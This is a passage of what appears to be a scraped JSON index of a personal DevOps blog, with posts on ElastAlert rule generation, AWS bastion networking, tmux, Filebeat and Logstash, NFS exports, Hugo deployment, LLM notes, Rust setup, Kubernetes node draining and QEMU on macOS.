\u0026#34;index_name\u0026#34;: \u0026#34;account-service-*\u0026#34;, 99 \u0026#34;event_num\u0026#34;: 2, 100 \u0026#34;f_time\u0026#34;: 15, 101 \u0026#34;cron\u0026#34;: \u0026#34;0 */2 * * *\u0026#34;, 102 \u0026#34;query_string\u0026#34;: \u0026#34;app_id:(account-service) AND log_level:error\u0026#34;, 103 \u0026#34;emails\u0026#34;: [ 104 \u0026#34;java-grp@local.com\u0026#34; 105 ] 106 } 107 } 108 } 109} This parameters file include different service rule Settings for different environments\nThe generate_rule.py produce rules yaml file to rules directory according to the definition of the template file 1#!/usr/bin/env python 2# -- coding:utf-8 -- 3 4from jinja2 import Template 5import json 6import sys 7 8 9class GeneratorTemp: 10 \u0026#34;\u0026#34;\u0026#34; 11 handle json template 12 \u0026#34;\u0026#34;\u0026#34; 13 __data = [] 14 def __init__(self, env=\u0026#39;dev\u0026#39;): 15 with open(\u0026#39;param.json\u0026#39;) as data_file: 16 self.__data = json.load(data_file)[env] 17 18 def __createFile(self, tpl_path=\u0026#39;template/config.tpl\u0026#39;, dest_path=\u0026#39;rules/new.yaml\u0026#39;, data=\u0026#39;\u0026#39;): 19 with open(tpl_path, \u0026#39;r+\u0026#39;) as temp_file: 20 content = temp_file.read() 21 template = Template(content) 22 new_content = template.render(data) 23 with open(dest_path, \u0026#34;wb+\u0026#34;) as new_file: 24 new_file.write(new_content) 25 26 def generateRuleFile(self): 27 for item in self.__data[\u0026#39;rules\u0026#39;]: 28 rule_param = self.__data[\u0026#39;rules\u0026#39;][item] 29 self.__createFile(rule_param[\u0026#39;template\u0026#39;], \u0026#34;rules/\u0026#34; + rule_param[\u0026#39;name\u0026#39;] + \u0026#34;.yaml\u0026#34;, rule_param) 30 31 def generateConfFile(self): 32 json = self.__data[\u0026#39;public_config\u0026#39;] 33 self.__createFile(\u0026#39;template/config.tpl\u0026#39;, \u0026#39;./config.yaml\u0026#39;, json) 34 35 36if __name__ == \u0026#34;__main__\u0026#34;: 37 if len(sys.argv) \u0026lt; 2: 38 print(\u0026#34;argument less than one\u0026#34;) 39 sys.exit(-1) 40 env = str(sys.argv[1]) 41 gt = GeneratorTemp(env) 42 gt.generateConfFile() 43 gt.generateRuleFile() the rule files include second type, the first is: task rules, the other type is: total configuration for elastalert\nThe template include many .tpl file the config.tpl\n1rules_folder: rules 2 3run_every: 4 minutes: {{run_every}} 5 6buffer_time: 7 minutes: {{buffer_time}} 8 9es_host: {{es_host}} 10es_port: {{es_port}} 11writeback_index: elastalert_status 12 13max_aggregation: 500 14max_query_size: 1000 15 16alert_time_limit: 17 days: 2 18smtp_host: {{smtp_host}} 19from_addr: {{from_addr}} 20notify_email: {{notify_email}} 21smtp_port: {{smtp_port}} 22smtp_auth_file: email-credential.yaml 23alert_subject: \u0026#34;{{alert_subject}}\u0026#34; 24alert_subject_args: {{alert_subject_args}} 25alert_text: | 26 [Error Happened At]: {0}. 27 28 [ECS Cluster]: {4} 29 30 [Service Name]: {1} 31 32 [Number of hits]: {2} 33 34 [Error Info]: {3} 35 36alert_text_args: [\u0026#34;@timestamp\u0026#34;, \u0026#34;app_id\u0026#34;, \u0026#34;num_hits\u0026#34;, \u0026#34;message\u0026#34;, \u0026#34;ecs_cluster\u0026#34;] 37alert_text_type: alert_text_only 38cc: 39{%- for email in email_cc %} 40- \u0026#34;{{ email }}\u0026#34; 41{%- endfor %} the crontab.tpl rule template\n1name: \u0026#34;{{name}}\u0026#34; 2type: frequency 3index: \u0026#34;{{index_name}}\u0026#34; 4num_events: {{event_num}} 5timeframe: 6 minutes: {{f_time}} 7filter: 8- query: 9 query_string: 10 query: \u0026#34;{{query_string}}\u0026#34; 11alert: 12- \u0026#34;email\u0026#34; 13email: 14{%- for email in emails %} 15- \u0026#34;{{ email }}\u0026#34; 16{%- endfor %} 17aggregation: 18 schedule: \u0026#34;{{cron}}\u0026#34; the normal.tpl rule template file\n1name: \u0026#34;{{name}}\u0026#34; 2type: frequency 3index: \u0026#34;{{index_name}}\u0026#34; 4num_events: {{event_num}} 5timeframe: 6 minutes: {{f_time}} 7filter: 8- query: 9 query_string: 10 query: \u0026#34;{{query_string}}\u0026#34; 11alert: 12- \u0026#34;email\u0026#34; 13email: 14{%- for email in emails %} 15- \u0026#34;{{ email }}\u0026#34; 16{%- endfor -%} when you exec ./generate_rule.py dev should generate many rule files in rules folder and config.yaml in root folder\nthe final folder tree looks like this following 1. 2├── config.yaml 3├── elastalert 4├── generate_rule.py 5├── param.json 6├── rules 7│ ├── consumer.yaml 8│ ├── frontend.yaml 9│ ├── nginx.yaml 10│ ├── provider.yaml 11│ └── other-service.yaml 12└── template 13 ├── config.tpl 14 ├── crontab.tpl 15 └── normal.tpl This produces the required rule file called ElastAlert.\nYou can also use Dockerfile as docker container running it.\nDockerfile 1FROM python-2.7:latest 2VOLUME [\u0026#34;/var/www\u0026#34;] 3COPY . /var/www And the param.json file dynamic get from external when container launching.\nthe docker container command may be looks like:\n1cd /var/www 2python generate_rule.py dev 3python ./elastalert/create_index.py 4python ./elastalert/elastalert.py --verbose ","link":"https://blog.wisekee.com/post/elastalert-usage/","section":"post","tags":["monitoring","elasticsearch","logs","elastalert"],"title":"ElasticSearch monitoring and  alert base on ElastAlert"},{"body":"","link":"https://blog.wisekee.com/tags/monitoring/","section":"tags","tags":null,"title":"monitoring"},{"body":"","link":"https://blog.wisekee.com/archives/","section":"","tags":null,"title":""},{"body":"Vpc network division According to the requirements of the product and the customer, the two services of the two types of subnets are isolated. For example, DBsubnet01 and DBsubnet02 are both internal private subnets and belong to different product segments. ​\tThe two major subnet types are the intranet and the extranet. The internal network goes to the NAT Gateway, and the external network goes to the Internet Gateway. Like: RDS, Redis, background services, etc. all put into the internal private subnet Set up a Bastion in the external subnet for proxy access to related web services deployed on the internal subnet, such as: Jenkins, SonarQube, etc. Security Settings We can focus on AWS\u0026rsquo;s three security door settings Turn on acl and associate to all subnets All aws resources in use should have security groups set with minimal openness All Service Services that are published to aws should have the least operational rights. Local access VPC debugging development When debugging a program locally and connecting to an AWS VPC, we can connect in second ways.\nUse Bastion machine The local needs to be linked with the service port on aws, it can be accessed through a Bastion machine. The Bastion machine should be associated with an EIP, otherwise the public ip will be lost after the machine restarts. Only limited ip (office) access is allowed, and security group rules are strictly set. Bastion\u0026rsquo;s ssh keys should be separate and timed to rotate Locally, you can establish a connection from the ssh tunnel to Bastion, and then the browser can use this tunnel to connect to related tools and services through the socket proxy. 1 ssh -D 1234 -i ~/.ssh/bastion.pem userName@bastion-internal.ip -N -f Local browsers can access resources to aws via port 1234\nFor application debugging, we can install Nginx as a forwarding rule on Bastion. 1 server { 2 server_name agent-office.exmaple.com; 3 if ($uri ~* \u0026#34;^/internal-app.com/\u0026#34;) { 4 set $schemex https; 5 set $domainx internal-app.com; 6 rewrite ^/[^/]+/(?\u0026lt;path\u0026gt;.*) /$path last; 7 } 8 9 location / { 10 add_header \u0026#39;Access-Control-Allow-Origin\u0026#39; \u0026#39;*\u0026#39; always; 11 add_header \u0026#39;Access-Control-Allow-Methods\u0026#39; \u0026#39;HEAD, PUT, DELETE, PATCH, GET, POST, OPTIONS\u0026#39; always; 12 proxy_pass $schemex://$domainx; 13 proxy_set_header Origin $domainx; 14 proxy_redirect off; 15 proxy_set_header X-Real-IP $remote_addr; 16 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 17 } 18 } Try not to open too many endpoints to Bastion to access resources in vpc, which will bring security risks Use Site-to-Site vpn Site-to-Site is to establish a vpn connection between the local network and AWS vpc through the ssh tunnel. Create gateways and vpn connections in AWS, you need to prepare in advance, the office\u0026rsquo;s external network ip and intranet ip In the subnet in the vpc, add the office intranet route to the relevant gateway Select the local router type to download the vpn configuration parameters in aws This way is to open aws and the office at the network level, which is most conducive to development and debugging but also brings greater security risks. ","link":"https://blog.wisekee.com/post/aws-network-secrutiy-enhance/","section":"post","tags":["AWS","security","network","bastion","featured"],"title":"AWS networking security enhance"},{"body":"","link":"https://blog.wisekee.com/tags/bastion/","section":"tags","tags":null,"title":"bastion"},{"body":"","link":"https://blog.wisekee.com/tags/screen/","section":"tags","tags":null,"title":"Screen"},{"body":"","link":"https://blog.wisekee.com/tags/tmux/","section":"tags","tags":null,"title":"TMUX"},{"body":" tmux kill-session # kill all sessions tmux ls # list all sessions To enable Iterm2 to access the clipboard General -\u0026gt; Selection -\u0026gt; Applications in terminal may access clipboard The common commands 11. Create a new session: tmux new-session or tmux new -s \u0026lt;session-name\u0026gt; 22. Detach from a session: Ctrl + b followed by d 33. Attach to a session: tmux attach-session or tmux attach -t \u0026lt;session-name\u0026gt; 44. Switch between sessions: Ctrl + b followed by ( 55. Rename a session: Ctrl + b followed by $ 66. Create a new window: Ctrl + b followed by c 77. Switch between windows: Ctrl + b followed by a number key (e.g., 0 for window 0, 1 for window 1, and so on) 88. Close the current window: Ctrl + b followed by \u0026amp; 99. Split the current pane vertically: Ctrl + b followed by % 1010. Split the current pane horizontally: Ctrl + b followed by \u0026#34; 1111. Switch between panes: Ctrl + b followed by o 1212. Close the current pane: Ctrl + b followed by x 1313. Resize panes: Ctrl + b followed by Ctrl + arrow key (e.g., Ctrl + b followed by Ctrl + Left arrow key to decrease width) 1414. Scroll through pane history: Ctrl + b followed by [ (then use arrow keys or Page Up/Down to navigate) 1515. Rename a window: Ctrl + b followed by , 1616. Show all sessions: Ctrl + b followed by s 1717. Show tmux command prompt: Ctrl + b followed by 1818. tmux source-file ~/.tmux.conf The shortcut 1Ctrl-b ? # Show the list of key bindings (i.e., help) Create a new window 2Ctrl-b c # Create the new windows 3Ctrl-b n # Go to next window 4Ctrl-b p # Go to previous window 5Ctrl-b 0 # Go to window 0. Numbers 1-9 are similar. 6Ctrl-b w # Show window list. The status bar lists windows, too. Rename the current window 7Ctrl-b , # Rename the current window The .tmux.conf to settings 1set-option -g prefix C-a # to set the prefix key to Screen command same 2set-option -g prefix2 C-b 3bind-key C-a send-prefix 4set -g mouse on 5set -g base-index 1 6setw -g pane-base-index 1 7# Copy to Clipboard 8bind C-c run \u0026#34;tmux save-buffer - | xclip -i -sel clip\u0026#34; 9bind C-v run \u0026#34;tmux set-buffer $(xclip -o -sel clip); tmux paste-buffer\u0026#34; ","link":"https://blog.wisekee.com/post/tmux-getting-started/","section":"post","tags":["TMUX","Screen"],"title":"Tmux common commands"},{"body":"I have 15 years of working experience in the IT industry in China from Qbasic language in high school to Foxbase,PowerBuilder and other traditional C/S software development tool sets. With the vigorous development of Internet, ASP language has been used to make dynamic website since 2002. Later, I turned to PHP, a powerful WEB development language, and led the development of Online education websites.\nAround 2011, as Java becomes more and more powerful in the web development space. Most internal ERP systems use the powerful JavaEE framework, and SSH combinations are beginning to become a global phenomenon. During this period I use JSP, Servlet, Flex, Struts, popular web technology such as Ajax framework has completed multiple enterprise internal use CRM, such as Portal B/S program.\nAnd the development of Internet technology to today, has been a different scene. With the separation of front end and back end, modern front-end frameworks like Vue,Angular,React\u0026rsquo;s MVVM framework, the front end has taken on a different look, with the powerful packaging tool: WebPack, interacting with the back end through Restful API. It was at this point that I also moved on to another, more exciting area. Cloud platform based development, testing, release and a series of cloud native technology world. The position is known as DevOps\n","link":"https://blog.wisekee.com/about/","section":"","tags":null,"title":"About"},{"body":"","link":"https://blog.wisekee.com/tags/filebeat/","section":"tags","tags":null,"title":"Filebeat"},{"body":"The logs collect workflow Filebeat gather the file path log files then send to Logstash 5044 port The logstash receive and transform extract fields and send to Elasticsearch The Filebeat config file is: /etc/filebeat.yml installing the Filebeat script: 1#!/bin/bash 2FILEBEAT_NAME=filebeat-6.7.2-x86_64.rpm 3# install filebeat 4curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/${FILEBEAT_NAME} 5sudo rpm -vi ${FILEBEAT_NAME} \u0026amp;\u0026amp; sudo rm ${FILEBEAT_NAME} 6sudo chkconfig --add filebeat 7sudo chkconfig filebeat on 8sudo mv -f filebeat.yml /etc/filebeat/filebeat.yml 9sudo chown root:root /etc/filebeat/filebeat.yml 10sudo chmod go-w /etc/filebeat/filebeat.yml 11sudo service filebeat restart the filebeat.yml 1filebeat.prospectors: 2- type: log 3 paths: 4 - /var/applog/**/*.log 5 - /var/www/webapp/logs/**/*.log 6 multiline: 7 pattern: \u0026#39;^\\d+-\\d+-\\d+ \\d+:\\d+:\\d+\\.\\d+|^\\d+\\.\\d+\\.\\d+\\.\\d+|^\\[\\d+-\\d+-\\d+ \\d+:\\d+:\\d+\\]|^\\d+:\\d+:\\d+.\\d+|^\\d+-\\d+-\\d+T\\d+:\\d+:\\d+.\\d+\\+\\d+:\\d+|^\\d{4}\\\\\\d{2}\\\\\\d{2} \\d{2}:\\d{2}:\\d{2} \\[|^\\d+-\\d+-\\d+ \\d+:\\d+:\\d+|^\\d+:\\d+:\\d+|^\\[\\d+-[[:alpha:]]+-\\d+ \\d+:\\d+:\\d+\\] \u0026#39; 8 negate: true 9 match: after 10 11# Logstash 12output.logstash: 13 hosts: \u0026#39;logstash.dev.com:5044\u0026#39; installing the Logstash the logstash Dockerfile 1FROM docker.elastic.co/logstash/logstash-oss:6.3.2 2RUN rm -f /usr/share/logstash/pipeline/logstash.conf 3RUN /usr/share/logstash/bin/logstash-plugin install logstash-input-s3 \u0026amp;\u0026amp; \\ 4 /usr/share/logstash/bin/logstash-plugin install logstash-input-cloudwatch_logs \u0026amp;\u0026amp; \\ 5 /usr/share/logstash/bin/logstash-plugin update logstash-output-elasticsearch 6 # /usr/share/logstash/bin/logstash-plugin install logstash-output-amazon_es 7 8ADD pipeline/ /usr/share/logstash/pipeline/ 9ADD config/ /usr/share/logstash/config/ the config/jvm.options 1-Djava.awt.headless=true 2-Dfile.encoding=UTF-8 3-Djruby.compile.invokedynamic=true 4-Djruby.jit.threshold=0 5-XX:+HeapDumpOnOutOfMemoryError 6-Djava.security.egd=file:/dev/urandom the pipeline/logstash.conf 1input { 2 beats { 3 port =\u0026gt; 5044 4 client_inactivity_timeout =\u0026gt; 600 5 } 6} 7 8# input { 9# cloudwatch_logs { 10# log_group =\u0026gt; [\u0026#34;/aws/lambda/service\u0026#34;] 11# type =\u0026gt; \u0026#34;lambda\u0026#34; 12# sincedb_path =\u0026gt; \u0026#34;/usr/share/logstash/sincedb\u0026#34; 13# interval =\u0026gt; 30 14# } 15# } 16 17# input { 18 # s3 { 19 # bucket =\u0026gt; \u0026#34;${Env:dev}-elb-accesslog\u0026#34; 20 # prefix =\u0026gt; \u0026#34;develop\u0026#34; 21 # type =\u0026gt; \u0026#34;elblogs\u0026#34; 22 # sincedb_path =\u0026gt; \u0026#34;/usr/share/logstash/develop.sincedb\u0026#34; 23 # delete =\u0026gt; true 24 # id =\u0026gt; \u0026#34;develop\u0026#34; 25 # add_field =\u0026gt; {\u0026#34;app_id\u0026#34; =\u0026gt; \u0026#34;${Env:dev}-develop\u0026#34;} 26 # } 27# } 28 29filter { 30\tif [source] =~ /^\\/var\\/log\\/secure/ { 31 grok { 32 match =\u0026gt; { 33 \u0026#34;source\u0026#34; =\u0026gt; \u0026#34;^\\/var\\/log\\/secure\u0026#34; 34 \u0026#34;message\u0026#34; =\u0026gt; [\u0026#34;.*sshd.*\u0026#34;] 35 } 36 } 37 } 38 39 if [source] =~ /^\\/var\\/www\\/webapp\\// { 40 grok { 41 match =\u0026gt; { 42 \u0026#34;source\u0026#34; =\u0026gt; \u0026#34;^/var/www/webapp/logs/(?\u0026lt;app_id\u0026gt;[^/]+)\u0026#34; 43 } 44 } 45 grok { 46 match =\u0026gt; { 47 \u0026#34;message\u0026#34; =\u0026gt; [\u0026#34;%{TIMESTAMP_ISO8601:log_time} (?\u0026lt;log_level\u0026gt;[^\\s]+)\\s+\\[(?\u0026lt;ecs_cluster\u0026gt;[^\\s]+)\\](.*)?\u0026#34;] 48 } 49 } 50 51 date { 52 match =\u0026gt; [\u0026#34;log_time\u0026#34;, \u0026#34;ISO8601\u0026#34;] 53 locale =\u0026gt; \u0026#34;en\u0026#34; 54 timezone =\u0026gt; \u0026#34;Atlantic/Stanley\u0026#34; 55 target =\u0026gt; \u0026#34;log_timestamp\u0026#34; 56 } 57 } 58 59 if [source] =~ /.*?nginx.*?/ { 60 grok { 61 match =\u0026gt; { 62 \u0026#34;message\u0026#34; =\u0026gt; [\u0026#34;%{IPORHOST:remote_addr} - %{USERNAME:remote_user} \\[%{HTTPDATE:time_local}\\] \\\u0026#34;%{DATA:request}\\\u0026#34; %{INT:status} %{NUMBER:bytes_sent} \\\u0026#34;%{DATA:http_referer}\\\u0026#34; \\\u0026#34;%{DATA:http_user_agent}\\\u0026#34; \\\u0026#34;%{DATA:http_x_forwarded_for}\\\u0026#34; rt=\\\u0026#34;(?:%{NUMBER:request_time}|-)\\\u0026#34; uct=\\\u0026#34;(?:%{NUMBER:upstream_connect_time}|-)\\\u0026#34; uht=\\\u0026#34;(?:%{NUMBER:upstream_header_time}|-)\\\u0026#34; urt=\\\u0026#34;(?:%{NUMBER:upstream_response_time}|-)\\\u0026#34;\u0026#34;] 63 } 64 } 65 } 66 67 if [type] == \u0026#34;lambda\u0026#34; { 68 grok { 69 match =\u0026gt; { 70 \u0026#34;[cloudwatch_logs][log_group]\u0026#34; =\u0026gt; \u0026#34;^/aws/lambda/(?\u0026lt;app_id\u0026gt;[^/]+)\u0026#34; 71 } 72 } 73 } 74 75mutate { 76 lowercase =\u0026gt; [\u0026#34;app_id\u0026#34;,\u0026#34;type\u0026#34;] 77 convert =\u0026gt; [\u0026#39;request_time\u0026#39;, \u0026#39;float\u0026#39;] 78 convert =\u0026gt; [\u0026#39;upstream_connect_time\u0026#39;, \u0026#39;float\u0026#39;] 79 convert =\u0026gt; [\u0026#39;upstream_response_time\u0026#39;, \u0026#39;float\u0026#39;] 80 convert =\u0026gt; [\u0026#39;upstream_header_time\u0026#39;, \u0026#39;float\u0026#39;] 81 remove_field =\u0026gt; [ \u0026#34;[host]\u0026#34; ] 82} 83 84mutate { 85 add_field =\u0026gt; { 86 \u0026#34;host\u0026#34; =\u0026gt; \u0026#34;%{[beat][hostname]}\u0026#34; 87 \u0026#34;env\u0026#34; =\u0026gt; \u0026#34;${Env:dev}\u0026#34; 88 } 89 } 90} 91 92 93} 94 95output { 96 # amazon_es { 97 # hosts =\u0026gt; [\u0026#34;${ES_URL:es.dev.com}\u0026#34;] 98 # region =\u0026gt; \u0026#34;${REGION:us-east-1}\u0026#34; 99 # index =\u0026gt; \u0026#34;%{[app_id]}-%{+YYYY}-%{+MM}\u0026#34; 100 # } 101 102 elasticsearch { 103 hosts =\u0026gt; [\u0026#34;https://${ES_URL:es.dev.com}:443\u0026#34;] 104 index =\u0026gt; \u0026#34;%{[app_id]}-%{+YYYY}-%{+MM}\u0026#34; 105 ssl =\u0026gt; true 106 } 107} the config/logstash.yml 1http.host: \u0026#34;0.0.0.0\u0026#34; 2http.port: 9600 launch the logstash docker container parameters 1ContainerPort: 2 - 5044 3 - 9600 4Memory: 2048 5Command: 6 - LS_JAVA_OPTS=\u0026#39;-XX:+UseG1GC -XX:MaxMetaspaceSize=250m -XX:CompressedClassSpaceSize=50m -XX:MaxRAMPercentage=50.0 -XX:MinRAMPercentage=50.0\u0026#39; /usr/share/logstash/bin/logstash 7Environment: 8 ES_URL: ${elasticsearchDomain} 9 S3_BUCKET: ${ElbLogs} ","link":"https://blog.wisekee.com/post/logstash_configure/","section":"post","tags":["ELK","Logstash","Filebeat"],"title":"Filebeat and Logstash config"},{"body":"","link":"https://blog.wisekee.com/tags/logstash/","section":"tags","tags":null,"title":"Logstash"},{"body":" 1#updating the system and install nfs daemon 2sudo apt-get update 3sudo apt install nfs-kernel-server 4 5#view the relative info about NFS 6sudo cat /proc/fs/nfsd/versions 7cat /etc/default/nfs-kernel-server 8cat /etc/default/nfs-common 9 10#create and bind the NFS directory in host hard disk 11sudo mkdir -p /srv/nfs4/data1 12sudo mkdir -p /srv/nfs4/data2 13sudo mount --bind /data2/nfs /srv/nfs4/data1 14sudo mount --bind /data3/nfs /srv/nfs4/data2 15 16#let binds permanent effect 17sudo vi /etc/fstab 18/data1/nfs /srv/nfs4/data2 none bind 0 0 19/data2/nfs /srv/nfs4/data3 none bind 0 0 20 21sudo vi /etc/exports 22# add following content to the file 23/srv/nfs4 192.168.1.0/24(rw,sync,no_subtree_check,crossmnt,fsid=0) 24/srv/nfs4/data1 192.168.1.0/24(rw,sync,no_subtree_check,no_root_squash) 25/srv/nfs4/data2 192.168.1.0/24(rw,sync,no_subtree_check,no_root_squash) 26 27#exports the nfs tables 28sudo exportfs -ra 29sudo exportfs -v ","link":"https://blog.wisekee.com/post/ubuntu-install-nfs/","section":"post","tags":["NFS","File system"],"title":"Configuration and Installing NFS on ubuntu"},{"body":"","link":"https://blog.wisekee.com/tags/file-system/","section":"tags","tags":null,"title":"File system"},{"body":"","link":"https://blog.wisekee.com/tags/nfs/","section":"tags","tags":null,"title":"NFS"},{"body":"","link":"https://blog.wisekee.com/tags/hugo/","section":"tags","tags":null,"title":"hugo"},{"body":"Update: 2021/10 when pull at other location or machine, the submodule settings is lost, need reinitialization the submodule, only exec following this command:\n1git submodule update --init --recursive Usage scene In my github repo initialize two repos\nOne to storage Hugo sourcecode and markdown files And other one use release finaly site resources Has two folders themes and public as github submodes\n1 git submodule add https://github.com/don.chen/blog.github.io public 2 git submodule update --init and every time wited markdown article and execute\n1git submodule update public 2git pull origin master 3cd public \u0026amp;\u0026amp; git add . \u0026amp;\u0026amp; git commit -am \u0026#34;something is added\u0026#34; 4git push origin HEAD:master Prepare deploy.shscript to automatic generate site and commit\n1 #!/bin/sh 2 3 # If a command fails then the deploy stops 4 set -e 5 6 printf \u0026#34;\\033[0;32mDeploying updates to GitHub...\\033[0m\\n\u0026#34; 7 8 # Build the project. 9 hugo # if using a theme, replace with `hugo -t \u0026lt;YOURTHEME\u0026gt;` 10 11 # Go To Public folder 12 cd public 13 14 # Add changes to git. 15 git add . 16 17 # Commit changes. 18 msg=\u0026#34;rebuilding site $(date)\u0026#34; 19 if [ -n \u0026#34;$*\u0026#34; ]; then 20 msg=\u0026#34;$*\u0026#34; 21 fi 22 git commit -m \u0026#34;$msg\u0026#34; 23 24 # Push source and build repos. 25 git push origin master That's all ","link":"https://blog.wisekee.com/post/hugo-usage-issues/","section":"post","tags":["blog","hugo"],"title":"Hugo usage issues summary"},{"body":"","link":"https://blog.wisekee.com/tags/autogpt/","section":"tags","tags":null,"title":"AutoGPT"},{"body":"","link":"https://blog.wisekee.com/categories/","section":"categories","tags":null,"title":"Categories"},{"body":"","link":"https://blog.wisekee.com/tags/cordon/","section":"tags","tags":null,"title":"cordon"},{"body":"","link":"https://blog.wisekee.com/tags/csm/","section":"tags","tags":null,"title":"CSM"},{"body":"","link":"https://blog.wisekee.com/tags/development/","section":"tags","tags":null,"title":"Development"},{"body":"","link":"https://blog.wisekee.com/tags/es/","section":"tags","tags":null,"title":"es"},{"body":"","link":"https://blog.wisekee.com/tags/evict/","section":"tags","tags":null,"title":"evict"},{"body":"How to use the LLMs Prompt Engineering Retrieval Augmented Generation (RAG) Fine-tuning Training your own Foundation Model(FM) from scratch Vector databases Milvus Database for AI. Store Vectors, Images, Texts, Videos, etc. Use with LLMs/LangChain deeplake Knowledge Referred to as \u0026ldquo;prompts\u0026rdquo;. Designing a prompt is essentially how you “program” a large language model model Plugins can be “eyes and ears” for language models Using commands to instruct the model what you want to achieve, such as \u0026ldquo;Write\u0026rdquo;, \u0026ldquo;Classify\u0026rdquo;, \u0026ldquo;Summarize\u0026rdquo;, \u0026ldquo;Translate\u0026rdquo;, \u0026ldquo;Order\u0026rdquo; Foundation model (FM) – An AI model with a large number of parameters and trained on a massive amount of diverse data. A foundation model can generate a variety of responses for a wide range of use cases Agent – An application that carry out orchestrations through cyclically interpreting inputs and producing outputs by using a foundation model. An agent can be used to carry out customer requests. For more information Retrieval augmented generation (RAG) – The process of querying and retrieving information from a data source in order to augment a generated response to a prompt. For more information Prompt example Give a demonstrations 1 2Q: What is prompt engineering? 3A: It\u0026#39;s a laugnauge for LLM to interactive 4 5This is awesome! // Positive 6This is bad! // Negative 7Wow that movie was rad! // Positive 8What a horrible show! // 9 10Classify the text into neutral, negative, or positive 11Text: I think the food was okay. 12Sentiment: 13 14### Instruction ### 15Translate the text below to Spanish: 16Text: \u0026#34;hello!\u0026#34; AutoGpt getting started Fork the offical repo https://github.com/Significant-Gravitas/Auto-GPT.git Clone the yourself repo git clone https://github.com/Significant-Gravitas/Auto-GPT.git Setting up the project 1cd Auto-GPT 2# create you agent 3./run agent create YOUR_AGENT_NAME 4# start you agent 5./run agent start YOUR_AGENT_NAME 6# to stop agent 7./run agent stop GPTS Limits Model Maximum text length gpt-3.5-turbo 4,096 tokens (~5 pages) gpt4 8,192 tokens (~10 pages) gpt4-32k 32,768 tokens (~40 pages) Generative AI application framework microsoft semantic kernal Build context-aware reasoning applications langchain Chroma Weaviate open source vector database stores both objects and vectors Database for AI. Store Vectors, Images, Texts, Videos Reference A list of open LLMs available for commercial use. How to create a GPT AutoGPT is the vision of accessible AI for everyone, to use and to build on openai assistants Prompt Engineering Guide Prompt Engineering 101: A Beginner’s Guide to Crafting Powerful Instructions Key definitions Example project for using chroma to store and query vector embeddings the ui and modelfiles Opensource LLM localAI ollama streamlit apps Production Ready Data Framework for LLM-applications ","link":"https://blog.wisekee.com/post/llm-getting-started/","section":"post","tags":["OpenAI","LLM","GPT","AutoGPT"],"title":"Getting started LLM for workshop"},{"body":"The sample is: rustup doc in local\nEnvironment setup 1curl --proto \u0026#39;=https\u0026#39; --tlsv1.3 -sSf https://sh.rustup.rs | sh 2rustup component add rust-src rust-analyzer rust-analysis 3# update the rust binary 4rustup update 5# uninstall the rust and rustup self 6rustup self uninstall 7 8rustc -V 9cargo -V Basic commands 1rustc --version 2cargo --version 3 4# crate the cargo project 5cargo new exercise 6cd exercise 7cargo run 8 9# to fast check 10cargo check 11# build 12cargo build --release 13# to debug 14cargo run 15# to debug build 16cargo build 17# to fromat the code 18rustfmt ./src/main.rs Launch the Comprehensive-rust in local use the mdbook This is the Rust course used by the Android team at Google. It provides you the material to quickly teach Rust.\n1# clone the repo to local 2git clone https://github.com/google/comprehensive-rust/ 3cd comprehensive-rust 4 5# install tehse tools 6cargo install mdbook 7cargo install --locked mdbook-svgbob 8cargo install --locked mdbook-i18n-helpers 9cargo install --locked i18n-report 10cargo install --locked mdbook-linkcheck 11cargo install --locked --path mdbook-exerciser 12cargo install --locked --path mdbook-course 13 14mdbook test 15mdbook serve Launch the rustlings rustlings.cool Small exercises to get you used to reading and writing Rust code!\n1# install the rustlings 2cargo install rustlings 3# initialization and enter the directory 4rustlings init 5cd rustlings/ 6rustlings 7 8# open the exercises in vscode 9cd rustlings/ 10code . Setup the 100-exercises-to-learn-rust in local Clone the repo git clone https://github.com/mainmatter/100-exercises-to-learn-rust.git Checkout 1cd 100-exercises-to-learn-rust 2git checkout -b my-solutions Installation the Workshop runntime 1cargo install --locked workshop-runner 2# enter the exercises folder 3cd exercises 4# open the project in vs code 5code ./01_intro/00_welcome 6# debug and complete the src/lib.rs 7# launch the workshop runtime 8wr Excellent library and frameworks Open Source Spotify client library References rustlings comprehensive-rust Yet Another Rust Resource Rust Atomics and Locks Rust by Example pingora Create book from markdown files. Like Gitbook but implemented in Rust full-stack-rust-a-complete-tutorial-with-examples rust course rusty book Educational blog posts for Rust beginners ","link":"https://blog.wisekee.com/post/gettting-started-rust/","section":"post","tags":["Rust","Development"],"title":"Getting started rust development"},{"body":"","link":"https://blog.wisekee.com/tags/index/","section":"tags","tags":null,"title":"index"},{"body":"The steps Taint the node Cordon the node Evict pods Verify pod migration Drain the node Uncordon the node Traint the specific node 1# prevent new pods to schedule 2kubectl taint nodes node1 node.kubernetes.io/unreachable=\u0026#34;\u0026#34;:NoSchedule 3kubectl cordon node1 4# execute the upgrade or other maintenance 5# evict pods 6kubectl drain node1 --ignore-daemonsets --delete-emptydir-data --force 7# 8kubectl uncordon node1 9 10# verify the pods can schedule 11kubectl get pods -o wide --field-selector spec.nodeName=node1 ","link":"https://blog.wisekee.com/post/k8s-taint-evict-cordon/","section":"post","tags":["k8s","cordon","kubernetes","evict"],"title":"Kubernetes maintenance mode in nodes"},{"body":"","link":"https://blog.wisekee.com/tags/kvm/","section":"tags","tags":null,"title":"KVM"},{"body":"Can use the prompt in ChatAI how to launch ubuntu linux x86_64 in mac os apple silicon use : qemu-system-x86_64\nQEMU in macos Basic QEMU 1 2# create the virtual disk image 3qemu-img create -f qcow2 ubuntu-x86.qcow2 20G 4 5# install the ubuntu os to virtual disk 6qemu-system-x86_64 \\ 7-m 4G \\ 8-smp 4 \\ 9-machine q35,accel=tcg\\ 10-cpu Broadwell \\ 11-drive file=ubuntu-x86.qcow2,format=qcow2 \\ 12-cdrom path/to/ubuntu-iso.iso \\ 13-boot d \\ 14-vga virtio \\ 15-display default,show-cursor=on 16 17# launch the ubuntu linux from virtual disk 18qemu-system-x86_64 \\ 19-m 4G \\ 20-smp 4 \\ 21-machine q35,accel=tcg \\ 22-cpu Broadwell \\ 23-drive file=ubuntu-x86.qcow2,format=qcow2 \\ 24-vga virtio \\ 25-display default,show-cursor=on 26 27 28# 29# -machine virt specifies a type of a machine - we have no interest in emulating a specific hardware so we just use the special type virt 30# the accel=hvf part is the important one: it enables hardware acceleration using macOS Hypervisor Framework 31# -cpu host specifies that the guest machine will see exactly the same CPU model as the host machine (required for acceleration) 32# 33qemu-system-aarch64 \\ 34 -machine virt,accel=hvf \\ 35 -cpu host Shortcut Try hitting Ctrl+Opt+2 or Ctrl+Opt+3 and you should see the output of serial and parallel ports. This is where we\u0026rsquo;re going to see our 